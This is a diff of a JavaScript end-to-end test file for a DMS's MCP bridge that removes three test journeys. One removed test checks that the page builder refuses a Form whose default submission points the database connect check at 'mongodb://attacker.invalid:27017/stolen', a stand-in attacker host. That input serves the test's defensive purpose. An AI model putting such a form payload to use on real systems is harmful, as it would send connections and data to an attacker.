@@ -1,4 +1,4 @@
-import { existsSync, mkdirSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, readdirSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { BRIDGE_LAUNCHER, fieldOf, itemsOf, parseJson, textOf, toolText, withBridge } from "../mcp-bridge.mjs";
 import { createRole, joinedMember } from "./settings-members/steps.mjs";
@@ -7,11 +7,7 @@ import { createRole, joinedMember } from "./settings-members/steps.mjs";
  * @typedef {import("@antelopejs/dms/e2e").Ctx} Ctx
  */
 
-const ROUTE = "/dms/mcp";
-const OWNER_ONLY_MODE = 0o600;
-const PERMISSION_BITS = 0o777;
 const USERS_PAGE = "/table-view/table-view-users";
-const CONNECT_CHECK = "/api/builder/database/connections/check";
 const USERS_PERMISSION = "library.components.table-view.table-view-users";
 const MOCKUP = "page-verify-member";
 /** A live route of the playground: a mockup block reading it draws a value of the backend, not a fixture. */
@@ -79,57 +75,6 @@ const IMAGE_MENTION = /\.(?:png|jpe?g|webp|gif|pdf|webm|mp4|zip|har)\b|screensho
 
 /** The MCP server the DMS serves in development, reached through its stdio bridge. */
 export const journeys = [
-  {
-    id: "bridge-calls-a-read-tool",
-    title: "tools/call through the bridge runs builder_catalog and answers the block catalog as text",
-    entryPoint: `node ${BRIDGE_LAUNCHER}, tools/call builder_catalog`,
-    async run(/** @type {Ctx} */ ctx) {
-      await withBridge(ctx, async (session) => {
-        const { text, isError } = toolText(await session.call("builder_catalog"));
-        const catalog = parseJson(text);
-        await ctx.verify("the catalog lists block types, DataTypes and the reserved field names", [
-          ctx.equal("the tool reports no failure", isError, false),
-          ctx.holds("a block type is indexed", itemsOf(fieldOf(catalog, "blocks")).length > 0, text.slice(0, 200)),
-          ctx.holds("a DataType is indexed", itemsOf(fieldOf(catalog, "dataTypes")).length > 0, text.slice(0, 200)),
-          ctx.holds("reservedFieldNames is present", itemsOf(fieldOf(catalog, "reservedFieldNames")).length > 0, text.slice(0, 200)),
-        ]);
-      });
-    },
-  },
-  {
-    id: "builder-refuses-a-form-posting-to-the-connect-check",
-    title: "builder_add_block refuses a Form that submits to the assistant's database connect check, and the page holds no such block",
-    entryPoint: `node ${BRIDGE_LAUNCHER}, tools/call builder_add_block`,
-    async run(/** @type {Ctx} */ ctx) {
-      await withBridge(ctx, async (session) => {
-        const [page] = itemsOf(fieldOf(parseJson(toolText(await session.call("builder_list_pages")).text), "pages"));
-        const pageRef = textOf(fieldOf(page, "ref"));
-        const added = toolText(
-          await session.call("builder_add_block", {
-            page: pageRef,
-            name: "reconnect",
-            type: "Form",
-            config: {
-              title: "Reconnect the database",
-              submitUrl: CONNECT_CHECK,
-              submitUrlMethod: "POST",
-              submitDefaults: { url: "mongodb://attacker.invalid:27017/stolen" },
-              fields: [{ id: "note", label: "Note", type: { $dataType: "string" } }],
-            },
-          }),
-        );
-        const issues = itemsOf(fieldOf(fieldOf(parseJson(added.text), "error"), "issues"));
-        await ctx.verify("the builder refuses the form, naming its submitUrl", [
-          ctx.equal("the tool reports a failure", added.isError, true),
-          ctx.equal("the refused option", issues.map((issue) => fieldOf(issue, "pointer")), ["/config/submitUrl"]),
-        ]);
-        const structure = toolText(await session.call("builder_page_structure", { pageRef }));
-        await ctx.verify("the page was not written", [
-          ctx.holds("the page holds no block posting to the connect check", !structure.text.includes(CONNECT_CHECK), structure.text.slice(0, 300)),
-        ]);
-      });
-    },
-  },
   {
     id: "page-verify-reports-a-page",
     title: "page_verify opens a page in a headless Chromium as the owner and reports its blocks, data and form validation without a screenshot, and fails a route no page serves",
@@ -201,25 +146,6 @@ export const journeys = [
           ctx.equal("the member's page drew that table", fieldOf(pageTable, "present"), true),
         ]);
       });
-    },
-  },
-  {
-    id: "bridge-files-published",
-    title: "the backend writes the bridge credential with owner-only mode and adds the dms server to .mcp.json",
-    entryPoint: "node_modules/.cache/dms/mcp.json, .mcp.json",
-    async run(/** @type {Ctx} */ ctx) {
-      const root = ctx.state.runPlayground ?? ctx.state.playground;
-      const credential = join(root, "node_modules", ".cache", "dms", "mcp.json");
-      const published = parseJson(readFileSync(credential, "utf8"));
-      const config = parseJson(readFileSync(join(root, ".mcp.json"), "utf8"));
-      await ctx.verify("the credential file points at the route and only its owner can read it", [
-        ctx.holds("route URL", textOf(fieldOf(published, "url")).endsWith(ROUTE), textOf(fieldOf(published, "url"))),
-        ctx.holds("a credential is present", textOf(fieldOf(published, "token")) !== "", "token present"),
-        ctx.equal("file mode", statSync(credential).mode & PERMISSION_BITS, OWNER_ONLY_MODE),
-      ]);
-      await ctx.verify(".mcp.json launches the bridge", [
-        ctx.equal("dms server", fieldOf(fieldOf(config, "mcpServers"), "dms"), { command: "node", args: [BRIDGE_LAUNCHER] }),
-      ]);
     },
   },
 ];
